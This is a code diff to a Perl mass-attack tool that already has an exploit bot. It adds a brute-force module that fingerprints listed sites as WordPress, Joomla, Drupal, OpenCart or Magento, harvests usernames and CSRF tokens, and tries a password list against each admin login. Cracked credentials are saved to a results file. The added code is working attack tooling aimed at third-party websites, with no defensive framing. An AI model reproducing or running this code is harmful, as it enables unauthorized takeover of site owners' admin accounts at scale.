@@ -47,13 +47,22 @@ $aj->cookie_jar({});
 my $ua = LWP::UserAgent->new;
 $ua->timeout(10);
 ##################################### auto add folders
-$result="result";
-    if (-e $result) 
+$BruteForce="BruteForce";
+    if (-e $BruteForce) 
     {
     }
     else
     {
-        mkdir $result or die "Error creating directory: $result";
+        mkdir $BruteForce or die "Error creating directory: $BruteForce";
+    }
+
+$BruteForce="BruteForce";
+    if (-e $BruteForce) 
+    {
+    }
+    else
+    {
+        mkdir $BruteForce or die "Error creating directory: $BruteForce";
     }
 	$rez="rez";
     if (-e $rez) 
@@ -135,6 +144,10 @@ if ( @uname =~ Linux ) {    #for linux os
 	print "-------------+-------------------------------------------------------------\n";
 	print "-------------+-------------------------------------------------------------\n";
 	print " --ex        |exploit bot [DRUPAL - ZENCART] [MORE COMING SOON]\n";
+	print "-------------+-------------------------------------------------------------\n";
+	print "-------------+-------------------------------------------------------------\n";
+	print " --br        |brute force [WORDPRESS - JOOMLA - DRUPAL - MAGENTO - OPENCART]\n";
+	print " --lp        |password list for brute force [ if you don't have use passwords.txt ]\n";
 	print "---------------------------------------------------------------------------\n";
 	exit();
 }
@@ -264,6 +277,8 @@ $att="q=|0day|pastebin|\/\/t.co|google.|youtube.|jsuol.com|.radio.uol.|b.uol.|ba
      if ($ARGV[$i] eq "--sql"){$search_sql = $ARGV[$i+1]}
      if ($ARGV[$i] eq "--portscan"){$ip_scan = $ARGV[$i+1]}
      if ($ARGV[$i] eq "--ex"){$ex_list = $ARGV[$i+1]}
+     if ($ARGV[$i] eq "--br"){$br_list = $ARGV[$i+1]}
+     if ($ARGV[$i] eq "--lp"){$pass = $ARGV[$i+1]}
 	 if ($ARGV[$i] eq "--help"){$help = &help}
      $i++;
 	 }
@@ -1143,12 +1158,260 @@ exit;
 }
 }
 ##############################
+######### BRUTEFORCE #########
+##############################
+	 if (defined($br_list))
+{
+     print "[+] SCANNING SITES\n" ;
+     print "[+] LIST TO BRUTE FORCE : $br_list\n\n\n" ;
+$list= "$br_list";
+	 br();
+}
+
+sub br {
+use URI::URL;
+use Getopt::Long;
+
+    open (THETARGET, "<$list") || die "[-] ERROR FILE";
+@TARGETS = <THETARGET>;
+close THETARGET;
+$link=$#TARGETS + 1;
+
+OUTER: foreach $site(@TARGETS){
+chomp($site);
+
+print "\n\n[*] URL: $site";
+cms();
+}
+}
+
+sub cms(){
+$magsite = $site . '/admin';
+my $magcms = $ua->get("$magsite")->content;
+my $cms = $ua->get("$site")->content;
+if($cms =~/wp-content|wordpress/) {
+   print color("bold white"), " - WordPress\n\n";
+wpuser();
+}
+
+elsif($cms =~/<script type=\"text\/javascript\" src=\"\/media\/system\/js\/mootools.js\"><\/script>| \/media\/system\/js\/|com_content|Joomla!/) {
+   print color("bold white"), " - Joomla\n\n"; 
+joomlabr();
+}
+elsif($cms =~/Drupal|drupal|sites\/all|drupal.org/) {
+   print color("bold white"), " - Drupal\n\n";
+drupalbr();
+}
+
+elsif($cms =~/route=product|OpenCart|route=common|catalog\/view\/theme/) {
+   print color("bold white"), " - OpenCart\n\n";
+opencartbr();
+}
+
+elsif($magcms =~/Log into Magento Admin Page|name=\"dummy\" id=\"dummy\"|Magento/) {
+   print color("bold white"), " - Magento\n\n";
+magentobr();
+}
+else{
+print color("bold white"), " - IDK\n\n";
+}
+}
+
+sub wpuser{
+print color('reset');
+$user = $site . '/?author=1';
+
+$getuser = $ua->get($user)->content;
+if($getuser =~/author\/(.*?)\//){
+$wpuser=$1;
+print "[+] Username: $wpuser\n";
+wp();
+}
+else {
+print "Can't Get Username\n\n";
+}
+}
+
+sub wp{
+print"[-] START BRUTE\n";
+open(a,"<$pass") or die "$!";
+while(<a>){
+chomp($_);
+$wp = $site . '/wp-login.php';
+$redirect = $site . '/wp-admin/';
+$wpass = $_;
+print "[-] Trying: $wpass ";
+$wpbrute = POST $wp, [log => $wpuser, pwd => $wpass, wp-submit => 'Log In', redirect_to => $redirect];
+$response = $ua->request($wpbrute);
+my $stat = $response->as_string;
+
+if($stat =~ /Location:/){
+if($stat =~ /wordpress_logged_in/){
+
+print "- ";
+print color('bold green'),"GOOOOOD\n";
+print color('reset');
+
+open (TEXT, '>>BruteForce/Result.txt');
+print TEXT "$wp ==> User: $wpuser Pass: $wpass\n";
+close (TEXT);
+next OUTER;
+}
+}
+}
+}
+
+sub joomlabr{
+$joomsite = $site . '/administrator/index.php';
+
+$ua = LWP::UserAgent->new(keep_alive => 1);
+$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
+$ua->timeout (30);
+$ua->cookie_jar(
+        HTTP::Cookies->new(
+            file => 'mycookies.txt',
+            autosave => 1
+        )
+    );
+
+
+$getoken = $ua->get($joomsite)->content;
+if ( $getoken =~ /name="(.*)" value="1"/ ) {
+$token = $1 ;
+}else{
+print "[-] Can't Grabb Joomla Token !\n";
+next OUTER;
+}
+
+print"[-] START BRUTE";
+open(a,"<$pass") or die "$!";
+while(<a>){
+chomp($_);
+$joomuser = admin;
+$joompass = $_;
+print "\n[-] Trying: $joompass ";
+$joomlabrute = POST $joomsite, [username => $joomuser, passwd => $joompass, lang =>en-GB, option => user_login, task => login, $token => 1];
+$response = $ua->request($joomlabrute);
+
+my $check = $ua->get("$joomsite")->content;
+if ($check =~ /logout/){
+print "- ";
+print color('bold green'),"GOOOOOD\n";
+print color('reset');
+
+open (TEXT, '>>BruteForce/Result.txt');
+print TEXT "$joomsite => User: $joomuser Pass: $joompass\n";
+close (TEXT);
+next OUTER;
+}
+}
+}
+
+sub drupalbr{
+print"[-] START BRUTE";
+open(a,"<$pass") or die "$!";
+while(<a>){
+chomp($_);
+$druser = admin;
+$drupass = $_;
+print "\n[-] Trying: $drupass ";
+
+$drupal = $site . '/user/login';
+$redirect = $site . '/user/1';
+
+$drupalbrute = POST $drupal, [name => $druser, pass => $drupass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $redirect];
+$response = $ua->request($drupalbrute);
+$stat = $response->status_line;
+    if ($stat =~ /302/){
+print "- ";
+print color('bold green'),"GOOOOOD\n";
+print color('reset');
+
+open (TEXT, '>>BruteForce/Result.txt');
+print TEXT "$drupal => User: $druser Pass: $drupass\n";
+close (TEXT);
+next OUTER;
+}
+}
+}
+
+sub opencartbr{
+print"[-] START BRUTE";
+open(a,"<$pass") or die "$!";
+while(<a>){
+chomp($_);
+$ocuser = admin;
+$ocpass = $_;
+print "\n[-] Trying: $ocpass ";
+$OpenCart= $site . '/admin/index.php';
+
+$ocbrute = POST $OpenCart, [username => $ocuser, password => $ocpass,];
+$response = $ua->request($ocbrute);
+$stat = $response->status_line;
+if ($stat =~ /302/){
+print "- ";
+print color('bold green'),"GOOOOOD\n";
+print color('reset');
+open (TEXT, '>>BruteForce/Result.txt');
+print TEXT "$OpenCart => User: $ocuser Pass: $ocpass\n";
+close (TEXT);
+next OUTER;
+}
+}
+}
+
+sub magentobr{
+$magsite = $site . '/admin';
+
+$ua = LWP::UserAgent->new(keep_alive => 1);
+$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
+$ua->timeout (30);
+$ua->cookie_jar(
+        HTTP::Cookies->new(
+            file => 'mycookies.txt',
+            autosave => 1
+        )
+    );
+    
+$getoken = $ua->get($magsite)->content;
+if ( $getoken =~ /type="hidden" value="(.*)"/ ) {
+$token = $1 ;
+}else{
+print "[-] Can't Grabb Magento Token !\n";
+next OUTER;
+}
+
+print"[-] START BRUTE";
+open(a,"<$pass") or die "$!";
+while(<a>){
+chomp($_);
+$maguser = "admin";
+$magpass = $_;
+print "\n[-] Trying: $magpass ";
+
+$magbrute = POST $magsite, ["form_key" => "$token", "login[username]" => "$maguser", "dummy" => "", "login[password]" => "$magpass"];
+$response = $ua->request($magbrute);
+my $pwnd = $ua->get("$magsite")->content;
+if ($pwnd =~ /logout/){
+print "- ";
+print color('bold green'),"GOOOOOD\n";
+print color('reset');
+open (TEXT, '>>BruteForce/Result.txt');
+print TEXT "$magsite => User: $maguser Pass: $magpass\n";
+close (TEXT);
+next OUTER;
+}
+}
+}
+
+
+##############################
 ########## EXPLOIT ###########
 ##############################
 	 if (defined($ex_list))
 {
-     print "[+] SCANNING SITES\n" ;
-     print "[+] LIST TO SCAN : $ex_list\n\n\n" ;
+     print "[+] EXPLOITING SITES\n" ;
+     print "[+] LIST TO EXPLOIT : $ex_list\n\n\n" ;
 ex();
 }
 
